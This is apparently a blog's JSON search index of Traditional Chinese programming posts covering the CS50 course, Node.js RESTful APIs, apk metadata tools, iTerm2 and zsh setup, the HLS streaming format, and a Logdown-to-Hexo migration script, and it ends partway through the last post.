{"pages":[{"title":"","text":"","link":"/404.html"},{"title":"關於我","text":"自學程式，後來跑去唸哲學系但沒念完，前往新加坡工作了兩年半後決定放一年的假，到處旅遊。喜歡教學，發現自己好像有把事情講得簡單又清楚的能力，相信分享與交流可以讓世界更美好。 LinkedIn 聯絡我：aszx87410@gmail.com","link":"/about/index.html"},{"title":"Archives","text":"","link":"/archive/index.html"},{"title":"推薦閱讀","text":"雖然說大部分文章都散散的，講不同的主題，但還是有一些可以合併起來成為一個系列，底下是一些推薦的系列。 JavaScript 五講 這是與 JavaScript 有關的的一系列文章，希望能透過這五篇文章讓大家釐清在 JavaScript 中常搞錯的觀念。 該來理解 JavaScript 的原型鍊了 深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？ 我知道你懂 hoisting，可是你了解到多深？ 所有的函式都是閉包：談 JS 中的作用域與 Closure 淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂 Session 與 Cookie 三部曲 藉由三篇文章徹底理解 Sesson 與 Cookie。 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作","link":"/recommend/index.html"}],"posts":[{"title":"如海洋般的程式課程：CS50","text":"CS50 的全名是 Introduction to Computer Science，是一堂哈佛大學的通識課程 在 edx 上面有開課，任何人都可以去修，甚至還有助教幫你改作業（只有程式作業，不包含其他像是紙本作業的那種題目） 我第一次聽到 CS50 這堂課，是經由這篇報導：CS50：一堂超過 800 個哈佛學生選修的「硬課」，魅力何在？ 一直到最近把這門課修完之後，才了解這門課厲害在哪裡。 先來回答標題的意思：如海洋般的程式課程。為什麼是海洋，因為這門課：又深又廣 有多深多廣呢？我記下每一週的課程大綱跟作業，請你身邊有資工背景的朋友看看，就會知道我在說什麼了 第零週 二進位、ASCII、RGB、二分搜尋法 介紹基本程式語言：條件判斷、變數、迴圈、陣列、函式 作業：用 scratch 寫一個程式 第一週 開始介紹 C 語言，以及講解 compile 的觀念 介紹各種形態，像是 double, float, int, bool, char, long long… 介紹浮點數誤差與 overflow 教你 command line 基本操作，像是 mv, ls, cd, make 等等 作業：寫一個簡單的 C 程式（迴圈印出星星） 第二週 介紹 function, string, array 以及如何利用 argc, argv 傳入參數 還有講到加密，像是 RSA 教了 command line 的 Redirecting（&gt;）還有 Pipe（|） 作業：字串處理，簡單加解密實作 第三週 搜尋、排序（氣泡、插入、選擇、快排、合併）、big O 遞迴、bit 操作 GDB 的使用 作業：實作O(n^2)的排序跟二分搜 第四週 再次講解遞迴 字串、指標、struct、bitmap 格式 檔案處理（fprint/fopen…） malloc，記憶體分配 教你用 xxd 看檔案的 hex 作業：給你 bitmap header 的文件，處理 bitmap 圖片，例如說放大兩倍 第五週 深入講解記憶體與指標 資料結構：linked list, queue, stack, tree, BST, tries, hashmap 教你用 wget 抓檔案，以及如何寫 Makefile 作業：實作字典樹或是 hashmap 第六週 這週開始講跟網路有關的，包括：IP, IPv6 domain, nslookup, traceroute, 封包 ports, dns, vpn, http, request, response 教你用chmod改檔案權限，以及curl抓網頁 作業：用 C 寫一個 http server（的部份功能） 第七週 chrome dev tool 的使用，像是看 html, request 基本 html 與 css 教學 php 簡介 get/post 參數介紹 sql基本教學 教你用apt-get安裝套件 作業：完成簡單的 php 網頁以及與資料庫溝通 第八週 示範重構程式碼，講解MVC的觀念 教基本 SQL 語法 有介紹到SQL Injection 作業：串Google Map API，使用jQuery跟ajax做出互動性較高的網頁 第九週 javascript 語法簡介 json 格式講解 DOM 模型 event handler，事件機制 （從這週以後沒有作業） 第十週 探討資訊安全與隱私權 像是密碼安全性（加密演算法、salting） 智慧型電視 釣魚信件 Two-factor authentication cookies, session, https 也稍微講了一下語音辨識，像siri背後的原理 第十一週 遊戲AI相關的介紹與無人車的介紹 有提到： dfs, bfs minimax evaluation function alpha-beta 剪枝 各種不同遊戲的ai特性 還講了一點機器學習，像是netflix怎麼推薦影片給使用者 第十二週 整個課程的回顧加上大家玩一點小遊戲 這週沒什麼課程 我修這門課的時候，簡直驚呆了 哇塞！居然教你怎麼寫Makefile，還教你用xxd看檔案，甚至給你bitmap的文件，要你按照這些格式把圖片讀取出來，然後放大之後寫回去！ 寫到我最崩潰的作業是 http server 那個，因為要用C做字串處理… 從上面洋洋灑灑十二週的課程介紹，就知道這門課真的又深又廣 稍微整理一下，你修完之後可以學到： 寫程式的基本功：變數、陣列、判斷、迴圈、函式 你學會了指標！ 直接操作記憶體，了解電腦底層在做什麼 熟悉基本排序演算法法與資料結構 各種 command line 指令的使用（我覺得這一點超級實用） 網路的基本知識（ip, dns, server, port, request, response…） 後端程式語言 php 前端 html/css/javascript 資料庫 mysql 的使用與指令 資訊安全（加解密、sql injection, buffer overflow） 機器學習、人工智慧、語音辨識初步了解 我一直以來都是自學程式的，儘管上大學之後有修過幾門程式相關的課 但都只是當做複習而已，沒有學到太多東西 可是這次碰到這門課，真的讓我打從心底讚嘆不已 他課程裡所介紹到的每一個東西都很實用，有些甚至連我也都是近期才會用的 以前自學的時候甚至連 command line 都沒用過勒！因為根本也沒有機會用到 除此之外，儘管這門課講的內容有深度，但老師在上課的時候幽默風趣，可以把生澀的概念講的很生動 例如說講到二分搜尋法，老師拿電話簿當做例子，接著直接從中間撕一半！ 又或是上到二進位，台上就有幾個燈泡，亮的就是1，暗的就是0，藉由這樣實體的互動加深印象 在課程教學上面，也有幾點是我很欣賞的 第一，從 scratch 入門 在修完 cs50 以後，我決定以後要教人程式設計，都要從scratch開始 因為它視覺化，你可以很明顯看到程式的結構長怎樣；而且它速度快、內建資源完整 你想做遊戲就拖拉幾個角色、定義一下事件就好 我認為`scratch是程式入門的最佳選擇 第二，把很難講解的概念先包裝起來 像是字串，在C裡面其實就是char*，或者說是char形成的陣列 可是在一開始，你要怎麼跟學生講解呢？ 於是他們就寫了一個string的type出來，把這些資訊隱藏起來，等之後上到陣列時，再跟學生講 還有scanf，會牽涉到pointer跟call by value之類的概念，這也不適合在一開始就講 可是程式還有要有輸入阿，怎麼辦呢？ 於是他們就包成一個GetInt()的函式，把這些細節封裝起來 第三，雲端IDE 要搭建開發環境不是件容易的事 CS50 與 c9 合作，提供線上的 IDE 你可以寫code，可以看檔案、可以用 command line 操作，一切作業都在上面完成 超級方便！ 最後 這一堂課真的是門硬課，但同時也是很扎實、很有用的課 推薦給任何想要學寫程式的人 若是你正在修，卻找不到人討論的話，可以到這個臉書社團： cs50 中文討論區","link":"/2016/03/28/cs50-programming-course-like-ocean/"},{"title":"用 Node.js 快速打造 RESTful API","text":"（原文發表於：http://blog.techbridge.cc/2016/04/23/fast-restful-nodejs-api-backend/） 前言 現今有些網站採用了 Single Page Application 的方案，後端只負責提供 API 讓前端抓取資料，達成完全的前後端分離。前端的選擇有很多種，你可以用 Angular，可以用 Ember.js，也可以用 React + Redux。至於後端的 API，必須符合固定格式，才能讓前端的人員比較好抓取。而這個「固定格式」，最常見的就是我們今天的重點：RESTful。 什麼是 RESTful？ 與起從硬生生的文字解釋下手，不如先從實際範例著手。假設現在你要寫一個部落格網站的後端 API，十個人可能會有十種寫法；例如說「抓取所有文章」這個功能： /api/blog/getList /api/blog/getAllArticle /api/blog/article/getAll /api/blog/fetchAll /api/blog/all 但如果是採取 RESTful 的方案，就會符合一定的格式： 操作 Method URL 所有文章 GET /api/posts 單一文章 GET /api/posts/:id 新增文章 POST /api/posts 刪除文章 DELETE /api/posts/:id 修改文章 PUT/PATCH /api/posts/:id 在這個例子裡，文章（posts）是一個 Resource，你可以透過 HTTP 提供的幾種方法搭配不同的 URL 存取這個 Resource。 如果你對 RESTful 很有興趣，這邊是一些值得參考的文章： 什麼是REST跟RESTful? 淺談 REST 軟體架構風格 理解RESTful架構 ORM ORM 的全稱是：Object Relational Mapping 如果以資料庫來說的話，就是把你的資料庫對應到程式裡的物件。舉上面的部落格的例子，你的資料庫 table 可能是這樣： 欄位 類型 說明 id int id title text 標題 content text 內文 created_at timestamp 建立時間 對應到 Node.js 裡面的物件，你可以這樣： 12345678// 建立文章Post.create(&#123; title: 'Hello Excel', content: '測試'&#125;)// 刪除 id 為 1 的文章Post.find(1).delete(); 也就是說，你今天根本不用管背後的資料庫用的是哪一種，也不用管 table 的名稱到底是什麼，你只要對你知道的這個 Post 物件做操作即可。 Sequelize是一套很好用的 ORM Library，只要先定義好一份schema，就可以幫你把物件跟資料庫關連起來。 為什麼突然提到 ORM？ 有些讀者可能已經想到，其實 RESTful API 跟 ORM 之間，是有某種程度的關聯的。怎麼說呢？ 假設我今天要寫一個留言板的後端 API，而且我又同時採用 RESTful 跟 ORM，我的程式就會長這樣： 123456789101112131415161718192021222324// 抓取所有留言// GET /api/messagesMessage.findAll();// 抓取單一留言// GET /api/messages/:idMessage.find(id);// 新增留言// POST /api/messagesMessages.create(&#123; content: content&#125;)// 刪除留言// DELETE /api/messages/:idMessages.find(id).delete();// 修改留言// PUT /api/messages/:idMessages.find(id).update(&#123; content: new_content&#125;) 那如果我今天是寫一個部落格的後端 API 呢？ 把上面的 messages 全部換成 posts，搞定！ 從以上例子可以看出，其實這兩樣東西是很適合搭配在一起的，因為兩個都能夠符合差不多的規則。 兩個願望一次滿足，epilogue epilogue 是一套 Node.js 的 Library，它結合了 Sequelize 跟 Express，主要目的就是讓我們能快速打造出 RESTful 的 API。 讓我們直接來看看官網的範例： 首先，你要先定義好的資料庫，跟你的 schema 12345var database = new Sequelize('database', 'root', 'password');var User = database.define('User', &#123; username: Sequelize.STRING, birthday: Sequelize.DATE&#125;); 再來，初始化 express 跟 epilogue 123456789101112var express = require('express'), bodyParser = require('body-parser');var app = express();app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended: false &#125;));server = http.createServer(app);epilogue.initialize(&#123; app: app, sequelize: database&#125;); 最後，靠 epilogue 把 url 跟資料庫關連起來，你要提供它你想要的 endpoint 跟要關連的 model 1234var userResource = epilogue.resource(&#123; model: User, endpoints: ['/users', '/users/:id']&#125;); 就是這樣簡單三個步驟，你就有了一個 RESTful API！是不是很簡單呢？ 還不只這樣 在實際的開發過程中，其實往往沒有那麼順利，例如說你的回傳格式可能跟資料庫的格式不一樣，或是你的某些 API 需要經過認證才能呼叫。沒關係，epilogue 都幫你想好了。 epilogue 提供了七種行為的 hook，包括 start, auth, fetch, data, write, send, complete，再搭配上 before, action, after 三種，你可以在任何一個階段做你想做的事情。 例如說你想在傳回結果之前做一點小小的變更，就是userResource.list.send.before，或是你可能想對某個 API 做驗證，那就是userResource.delete.auth。 這邊提供兩個官網的完整範例： 123456789101112131415161718// 禁止刪除 useruserResource.delete.auth(function(req, res, context) &#123; throw new ForbiddenError(\"can't delete a user\");&#125;)// 先看有沒有 cache，有的話直接返回 cache 的內容userResource.list.fetch.before(function(req, res, context) &#123; var instance = cache.get(context.criteria); if (instance) &#123; // keep a reference to the instance and skip the fetch context.instance = instance; return context.skip; &#125; else &#123; // cache miss; we continue on return context.continue; &#125;&#125;) 總結 若是你的後端 API 沒有很複雜，都是基本的 CRUD 的話，那 epilogue 絕對是很適合你的一套框架，只要你把資料庫的 schema 開出來，程式碼複製貼上一下就能夠完成一個 API。若是讀者之後有相關的需求，不妨試試看吧！","link":"/2016/09/29/fast-restful-nodejs-api-backend/"},{"title":"快速取得 apk 相關資訊","text":"（原文發表於：http://blog.techbridge.cc/2016/05/20/fast-way-to-get-apk-information/） 前言 在 之前，我們曾經介紹過如何反編譯 Android Apk。而藉由反編譯，我們可以知道許多跟 apk 有關的資訊，例如說 AndroidManifest.xml，只要這個檔案就可以看出 apk 的一些基本資訊，還可以看到整個 apk 的程式碼跟使用到的資源（圖檔、影片、聲音等等）。 但若是今天我們只想要知道基本資訊，完全不想知道 apk 是怎麼寫的，也根本不關心它用到哪些資源，那該怎麼辦呢？反編譯需要一點時間，愈大的 apk 需要愈久，有沒有更好的方法呢？ 需要哪些資訊？ 首先我們先來定義一下「基本資訊」指的是哪些。以我來說，我想取得的基本資訊有以下六點： package name version code version name launch activity Google SHA1 Fingerprint Facebook Keyhash 前四個的用途在於，假設你今天做了一個公司內部的 apk 上架系統，如果有了前四項資訊，就可以做跟 Google Play 相似的驗證，例如說驗證 package name 跟上次上傳的是否一樣、版本號是否比上一次的高等等。 至於後兩個呢？有串接過 Google 跟 Facebook 登入的讀者就會知道，這兩個是串登入時必備的東西。你要在設定裡面新增這兩組 key，才能夠使用登入功能，否則會出現驗證錯誤之類的字眼。 知道我們需要哪些以後，就來動手做吧！ 好用的 keytool keytool 是系統內建，與認證相關的指令。 我們可以用 keytool -list -printcert -jarfile NAME.apk 提取出一些資訊： 1234567891011121314簽署者 #1:簽章:擁有者: CN=Android Debug, O=Android, C=US發出者: CN=Android Debug, O=Android, C=US序號: 4b52355e有效期自: Sun Jan 17 05:53:34 CST 2010 到: Mon Jan 17 05:53:34 CST 2011憑證指紋: MD5: 14:99:01:12:7A:69:CD:75:4F:31:75:8C:59:F6:71:63 SHA1: 24:69:FD:17:6B:C3:43:FC:3A:85:EC:4B:C5:D7:9F:09:4A:71:60:80 SHA256: 57:EB:73:81:D7:08:E6:45:FE:26:99:FB:3C:1F:37:1E:EE:38:39:20:E0:2D:C6:76:0E:84:2B:DD:1C:5C:C9:70 簽章演算法名稱: SHA1withRSA 版本: 3 以這個 apk 來說，列出了：擁有者、發出者、有效期限、憑證指紋等等的資訊，而其中的 SHA1 就是 Google 登入會用到的資訊。 那 Facebook Keyhash 呢？從 官方文件 可以知道，其實就只是把 sha1 先變成 binary 然後再做 base64 而已。 只要有了 sha1，搭配一些指令，就可以很簡單的生成 Facebook Keyhash。 萬能的 aapt aapt 的全名是：Android Asset Packaging Tool，超級好用！ 可以先來看看 aapt 到底可以做哪些事情 由於我們需要的是取出資訊，因此直接看 dump 的部份： 1234567aapt d[ump] [--values] WHAT file.&#123;apk&#125; [asset [asset ...]] badging Print the label and icon for the app declared in APK. permissions Print the permissions from the APK. resources Print the resource table from the APK. configurations Print the configurations in the APK. xmltree Print the compiled xmls in the given assets. xmlstrings Print the strings of the given compiled xml assets. 有興趣的讀者可以每一個都試試看，看會出現什麼結果。以我們的需求來講，badging 是最符合的 aapt dump badging NAME.apk 123456789101112131415161718192021222324252627282930package: name=&apos;com.gmail.aszx87410.movie_to_nine&apos; versionCode=&apos;1&apos; versionName=&apos;1.0&apos;sdkVersion:&apos;8&apos;targetSdkVersion:&apos;16&apos;uses-permission:&apos;android.permission.INTERNET&apos;uses-gl-es:&apos;0x20000&apos;uses-feature-not-required:&apos;android.hardware.telephony&apos;uses-feature:&apos;android.hardware.screen.portrait&apos;uses-feature-not-required:&apos;android.hardware.screen.landscape&apos;application-label:&apos;今晚九點電影2.0&apos;application-label-he:&apos;今晚九點電影2.0&apos;application-label-es:&apos;今晚九點電影2.0&apos;application-label-iw:&apos;今晚九點電影2.0&apos;application-icon-120:&apos;res/drawable-ldpi/icon.png&apos;application-icon-160:&apos;res/drawable-mdpi/icon.png&apos;application-icon-240:&apos;res/drawable-hdpi/icon.png&apos;application-icon-320:&apos;res/drawable-xhdpi/icon.png&apos;application-icon-480:&apos;res/drawable-xxhdpi/icon.png&apos;application: label=&apos;今晚九點電影2.0&apos; icon=&apos;res/drawable-mdpi/icon.png&apos;launchable-activity: name=&apos;com.ansca.corona.CoronaActivity&apos; label=&apos;今晚九點電影2.0&apos; icon=&apos;&apos;uses-feature:&apos;android.hardware.touchscreen&apos;uses-implied-feature:&apos;android.hardware.touchscreen&apos;,&apos;assumed you require a touch screen unless explicitly made optional&apos;mainother-activitiesother-receiversother-servicessupports-screens: &apos;small&apos; &apos;normal&apos; &apos;large&apos; &apos;xlarge&apos;supports-any-density: &apos;true&apos;locales: &apos;--_--&apos; &apos;he&apos; &apos;es&apos; &apos;iw&apos;densities: &apos;120&apos; &apos;160&apos; &apos;240&apos; &apos;320&apos; &apos;480&apos;native-code: &apos;&apos; &apos;armeabi-v7a&apos; 將將將將～ 我們所需要的資訊全部出現在這裡了，還附帶權限列表、app logo、app 名稱等等的資訊 做到這邊，全部需要的東西都有了，剩下就只是切出字串與整合而已 總結 今天這篇文章簡單介紹了 keytool 跟 aapt 的使用，主要是想要不靠 apktool，利用其他工具取出我們想要的資訊，既省時又省力。 如果你有興趣知道最後做出來的成品長怎樣，apkinfo.sh 是我放在 github 上面的一個小專案，用途就跟這篇文章所教的一樣，就是取出 apk 的相關資訊。","link":"/2016/09/29/fast-way-to-get-apk-information/"},{"title":"[心得] iTerm2 + zsh，打造更好的工作環境","text":"平常有在寫 code 的，無論是寫哪一種程式語言、或是哪一種開發環境，都會有一定的時間需要執行一些命令 這時候就會開啟 terminal 開始鍵入指令，最常用的像是cd, ls, git, ssh, rsync之類的 可是系統內建的終端機其實滿難用的，今天要跟大家推薦一套比較好的選擇 iTerm2可以取代你的終端機，裝了以後保證你每次都不會想要打開內建的，而是打開這個應用程式。 用這個有什麼好處呢？第一就是很多設定可以調、可以個人化；第二就是介面比較好看，也比較好操作；第三則是可以開很多個分頁，就跟你用瀏覽器一樣，如果要分割畫面的話也是很容易的。 裝好以後可以先來挑個自己中意的佈景主題，很多人都用 solarized，但我自己是比較喜歡 dracula。這邊純粹看你自己覺得哪套比較好看就裝哪個。 外觀都弄的差不多之後，可以開始來裝 zsh 了 zsh 是什麼呢？這個就要先從 bash 開始講了，你現在無論是打開 iTerm2 或是內建的終端機，出現的畫面都是在執行 bash 的畫面，所以 bash 也是一個程式，那當然也可以被取代掉。 我自己用過的兩套一套就是 zsh，另一套是 fish 其實 fish 我用的滿不錯的，但看到 zsh 好像外掛比較多、佈景主題也比較多所以就跳過來了，fish 我覺得內建的功能就滿夠用了，尤其是自動提示的功能超 OP，每次都覺得很厲害 至於 zsh 的話，其實 mac 就有內建了，但除了這個以外，推薦必裝的東西叫做：oh-my-zsh，他先幫你載好一些主題、外掛跟設定，簡單來說可以看成是 zsh 的懶人包版本，裝了之後有一堆東西可以用。 ~/.zshrc是你的設定檔，要調什麼都來這邊調就對了 裝好以後第一件事情當然還是換主題，或是也可用random，每次開啟的時候都會用不同的主題，也是滿特別的。 agnoster是一套滿 fancy 的主題，要裝之前記得先 安裝字型，並且在 iTerm2裡面的 Preference -&gt; Profile -&gt; Text 調整好字型，才能夠正確看到一些特殊符號。 我自己是用 tonotdo這個主題然後再改了一下，他原本時間在最右邊，我把它調到最左邊然後上色 這個主題還滿容易改的，檔案在~/.oh-my-zsh/themes/tonotdo.zsh-theme，我把前三行改成： 1PROMPT=&apos;%&#123;$fg_no_bold[yellow]%&#125;[%*] %&#123;$fg_no_bold[cyan]%&#125;%n%&#123;$fg_no_bold[red]%&#125; ➜ %&#123;$fg_no_bold[green]%&#125;%3~$(git_prompt_info)%&#123;$reset_color%&#125;» &apos; 大家可以自己試著改改看，滿容易的 裝好佈景主題以後開始來裝外掛，oh-my-zsh wiki裡面有介紹了一下每個內建外掛是在做什麼，只要在設定檔加一些字就可以使用了，預設只會幫你啟用git。 如果想裝更多的，在awesome-zsh-plugins可以找到，我自己就多裝了zsh-autosuggestions。 介紹到這邊就差不多了，剩下都是個人設定微調的部份，或是裝一些自己覺得實用的 plugin 附上一張我的 iTerm2 截圖當做結尾 參考資料： 認識與學習BASH iTerm - 让你的命令行也能丰富多彩 Mac OS X 的 Command Line 環境設定 [iTerm2] 美化你的Terminal bash 轉移 zsh (oh-my-zsh) 設定心得 Oh-My-Zsh 讓你的終端機更強大更美觀","link":"/2016/01/03/iterm2-zsh-better-environment/"},{"title":"直播協議 hls 筆記","text":"前言 最近剛好在做直播相關的東西，雖然說是做前端，但還是必須懂一些直播的原理 至少要知道有哪些格式，以及各種格式的優缺點是什麼，做起來也會比較踏實 這篇就簡單記錄一些心得跟資料，如果想比較深入了解 hls 的，可以參考下面這兩篇文章： 直播协议的选择：RTMP vs. HLS 在线视频之HLS协议—学习笔记：M3U8格式讲解及实际应用分析 hls 是什麼？ 我覺得以直播來說，hls 是一個相當好懂的協定，其實就是透過一個 .m3u8 的播放列表，然後裡面有多個 .ts 的檔案 你只要照著播放列表裡面給你的檔案順序播放就好了，聽起來很容易吧！ 為了讓大家更明白，直接附上擷取自某處的播放列表： 123456789101112131415#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-MEDIA-SEQUENCE:4454#EXT-X-TARGETDURATION:4#EXTINF:3.998, no desc25133_src/4460.ts#EXTINF:3.992, no desc25133_src/4461.ts#EXTINF:3.985, no desc25133_src/4462.ts#EXTINF:3.979, no desc25133_src/4463.ts#EXTINF:3.996, no desc25133_src/4464.ts 就算你沒看過這個格式，你大概看一下也可以猜出來它在做什麼 每一個 ts 就是一個片段，然後 #EXTINF:3.996 代表這個片段的時間長度 #EXT-X-TARGETDURATION:4，這邊的數字必須比播放清單中的任何一個影片的時間都大 代表播放器應該每隔幾秒去抓一次新的播放清單 例如說，下一次抓到的可能會長這樣： 123456789101112131415#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-MEDIA-SEQUENCE:4455#EXT-X-TARGETDURATION:4#EXTINF:3.992, no desc25133_src/4461.ts#EXTINF:3.985, no desc25133_src/4462.ts#EXTINF:3.979, no desc25133_src/4463.ts#EXTINF:3.996, no desc25133_src/4464.ts#EXTINF:3.998, no desc25133_src/4465.ts 就是最後面多了一個片段。所以只要一直維持這個規則，就能夠不斷取到新的片段 那如果很不巧的，server 沒有及時產生出播放列表怎麼辦呢？ 例如說在第 4 秒的時候去拿，發現沒更新，server 在第 4.5 秒才把新的播放片段產生出來 如果發生這種「拿了播放清單，但長的一樣」的情形，就會把抓取的時間減一半，直到抓到為止 像以上情形，第 4 秒沒拿到新的，就會隔 2 秒之後再去抓 這個規則可以參考：HTTP Live Streaming draft-pantos-http-live-streaming-20 When a client loads a Playlist file for the first time or reloads a Playlist file and finds that it has changed since the last time it was loaded, the client MUST wait for at least the target duration before attempting to reload the Playlist file again, measured from the last time the client began loading the Playlist file. If the client reloads a Playlist file and finds that it has not changed then it MUST wait for a period of one-half the target duration before retrying. 至於做直播最關心的延遲問題，也可以直接從這個播放列表直接推測出來 以上面的例子來說，一共有 5 個片段，每一個片段 4 秒，延遲就是 20 秒 Apple 官方建議的是 3 個片段，每個片段 10 秒 What duration should media files be? A duration of 10 seconds of media per file seems to strike a reasonable balance for most broadcast content. How many files should be listed in the index file during a continuous, ongoing session? The normal recommendation is 3, but the optimum number may be larger. 可參考：Apple: HTTP Live Streaming Overview 不過依照官方的建議，就會有 30 秒的延遲，當然延遲越久直播的狀況會越好，可是體驗也會比較差一點 因此，我們可以來看看幾個直播網站都是怎麼設定的 先來看看直播大頭：Twitch 1234567891011121314151617181920#EXTM3U#EXT-X-VERSION:3#EXT-X-TARGETDURATION:5#ID3-EQUIV-TDTG:2016-11-26T02:40:23#EXT-X-MEDIA-SEQUENCE:376#EXT-X-TWITCH-ELAPSED-SYSTEM-SECS:1511.137#EXT-X-TWITCH-ELAPSED-SECS:1508.980#EXT-X-TWITCH-TOTAL-SECS:1535.137#EXTINF:4.000,index-0000000377-6zCW.ts#EXTINF:4.000,index-0000000378-vHZS.ts#EXTINF:4.000,index-0000000379-Gkgv.ts#EXTINF:4.000,index-0000000380-PNoG.ts#EXTINF:4.000,index-0000000381-h58g.ts#EXTINF:4.000,index-0000000382-W88t.ts 6 個片段 * 4 秒 = 24 秒 可是如果你仔細觀察（開 chrome devtool 就可以了），實際上 twtich 的播放器在拿到列表以後 會直接嘗試從「倒數第三個」片段開始載入，所以延遲就縮短為 3*4 = 12 秒了 再來看看台灣的 livehouse.in 123456789101112#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:NO#EXT-X-MEDIA-SEQUENCE:2291#EXT-X-TARGETDURATION:6#EXTINF:5.2090001106262207,1480116261segment_v02291.ts#EXTINF:5.2080001831054688,1480116261segment_v02292.ts#EXTINF:5.2080001831054688,1480116261segment_v02293.ts 5*3 = 15 秒 所以一般用 hls 的直播網站，延遲大概都會在 10~20 秒這個區間以內 我猜比這個短的話對 server 壓力可能很大，而且網速慢的話，看起來會很卡 比這個長的話雖然很順，但是使用者體驗不太好，延遲太高 所以能找到最好的延遲就是在這個區間內了 最後，我們來看看如果要在網頁上播放的話，有哪些選擇 因為現在已經是個 flash 快死掉的年代了，所以如果可以的話，首選當然是 html5 瀏覽器支援度不夠高的話再 fallback 回去 flash 先來介紹一下現成的商業授權播放器，例如說 jwplayer 或是 flowplayer，都是很不錯的選項。 尤其是當 open source 的方案出現問題你又修不好的時候，就會很希望公司花錢買一個商業播放器，一切問題都搞定。 open source 的方案大概就是 videojs 一支獨秀了，有沒有其他的後起之秀我是不知道啦，有的話麻煩推薦一下。 然後因為 hls 這個格式瀏覽器本身是沒辦法播放的，所以要搭配一些 plugin videojs 官方有一個 videojs-contrib-hls，加上去之後就可以播放了，但我自己用過以後感覺不是很好。 最後選擇了知名的影音網站 dailymotion 提供的開源解決方案 hls.js。 這一篇是他們官方的部落格，有介紹說為什麼要自己寫一套，以及解決了哪些問題，滿值得一看的，可以順便了解一下。","link":"/2016/11/26/livestreamming-hls-note/"},{"title":"部落格搬家心得：從 Logdown 到 Hexo","text":"前言 終於搬完啦！ 花了一整天的時間在搞搬家的東西，其實真的挺麻煩的，而且中途碰到滿多小問題，所以特地寫這篇來紀錄一下心得。 為什麼搬家？ 你知我知獨眼龍也知，Logdown 基本上已經是一個停滯的產品了，從很久以前就不再更新了，看樣子應該也不會再更新了。 我真的滿喜歡 Logdown 的，因為我覺得使用起來很方便很順手，完全打到我，到既然是個停止維護的產品，繼續在那邊就會有一些風險，例如說哪天 blog 突然掛掉連不上或者是文章全部不見之類的。 所以囉，就趁著最近有空趕快把部落格整個搬出來，避免之後發生什麼災難就來不及了。 不過其實我也是滿不想搬的…畢竟搬家真的超麻煩，而且這次又換一個全新的 Domain，往長遠來看是好的啦，但也代表要放棄之前累積的那些流量就是了。 第一個挑戰：匯出文章 Logdown 後台有一個功能可以匯出所有 blog 的文章然後寄到你信箱，但我按了幾次他只有出現：「在 5 分鐘之後會把文章寄到你信箱」的通知，之後就什麼都沒收到了。 所以我推測要嘛就是壞了，要嘛就是我文章太多檔案大小超過所以 GG。但不論是哪一種，都注定我用不到這個功能了。 身為一個工程師，我馬上想到是不是該寫個爬蟲之類的，研究了一下 Logdown 的結構之後放棄了，因為他所有 API 傳回的資料都是 HTML…我不想自己 parse 啊… 正當絕望之際，突然發現後台有個「下載 Markdown 格式」的功能，可以下載單篇文章，試過這個功能正常之後，立刻想到一個解法： 只要有所有下載文章連結，就可以寫 script 全部載下來了 第一步：取得網址 到 logdown 後台（http://logdown.com/account/posts ），然後一直往下捲動直到沒有文章為止。 打開 Chrome devtool 執行下面程式碼，然後把結果按右鍵保存起來 1var a = Array.prototype.map.call(document.querySelectorAll('a'), item =&gt; item.getAttribute('href')).filter(item =&gt; item.indexOf('/raw') &gt;= 0);for(var k of a) &#123;console.log('\"'+k+'\"')&#125; 沒意外的話，console 應該會出現像下面這種結果： 1234....VM192:1 \"/account/posts/294284-javascript-redux-middleware-details-tutorial/raw\"VM192:1 \"/account/posts/294037-javascript-redux-basic-tutorial/raw\"VM192:1 \"/account/posts/293940-javascript-redux-model-real-world-browserhistory-not-found/raw\" 自己把前面那個惱人的字串取代掉之後，你就得到所有文章的網址了。 第二步：下載 可是取得網址之後，這麼多網址要怎麼下載呢？ 很簡單，我們自己寫個 bash script 就搞定了！核心程式碼就是用 wget 把文章抓下來，這邊的 session key 自己去 chrome 裡面看 cookie 的值就好： 1wget --heade=\"Cookie:_logdown_session=xxxx;\" http://logdown.com/account/posts/2223627-review-the-classical-sort-algorithm-with-javascript/raw -O review-the-classical-sort-algorithm-with-javascript.md 完整 script： 12345678910111213declare -a arr=(\"/account/posts/2223627-review-the-classical-sort-algorithm-with-javascript/raw\"\"/account/posts/2223612-dom-event-capture-and-propagation/raw\"\"/account/posts/2223601-http-cache/raw\"\"/account/posts/2223581-ajax-and-cors/raw\")for i in \"$&#123;arr[@]&#125;\"do url=\"http://logdown.com\"$&#123;i&#125; name=`echo $url | sed \"s/.*posts\\/[0-9]*[-]//g\" | sed \"s/\\/raw//g\"` wget --heade=\"Cookie:_logdown_session=xxx;\" $url -O $name\".md\"done 把 arr 下面那些換成剛剛從 chrome 得來的網址並且把 session 換成自己的就搞定了，就把所有文章都下載了！ 當個工程師真好 第二個挑戰：修文章格式 從 logdown 下載下來的還需要加一些 meta tag 才能在 hexo 上面正常跑，而且我也想順便修一下 tag，這部分我完全是手動修…修了兩百篇左右，因為要加 tag 這也不能自動加。（硬要寫也是可以啦，但我懶得弄） 還有一個地方是我有文章用到 hexo 禁止的語法，就是兩個大括號那個，hexo 就直接報錯，然後也沒跟我講哪一篇，我只好自己用二分搜尋法，不斷拿掉文章看問題到底出在哪邊。 第三個挑戰：table of content 壞掉 現在大概右邊看到那個就是 TOC，Table Of Content，是個我滿喜歡的功能，但不知道為什麼這功能壞掉了，在我自己去 trace hexo 的 code 之後，發現是一個滿奇怪的問題，就是 cheerio 抓不到 span 的 id，所以連結全部變成 undefined。 身為工程師，這種小問題當然是可以自己修，於是我就修了兩個小地方： 1234567891011121314151617// 原本的var $ = cheerio.load(str);// 改過的，加上 decodeEntities 處理中文// https://cnodejs.org/topic/54bdd639514ea9146862ac37var $ = cheerio.load(str, &#123;decodeEntities: false&#125;);// 原本的，會抓不到 idvar id = $(this).attr('id');// 自己加上下面這一段用 Regexp 抓出來if (!id) &#123; var temp = $(this).html().match(/id=\"(.*)\"&gt;/); if (temp &amp;&amp; temp[1]) &#123; id = temp[1]; &#125;&#125; 當一個工程師真好 結論 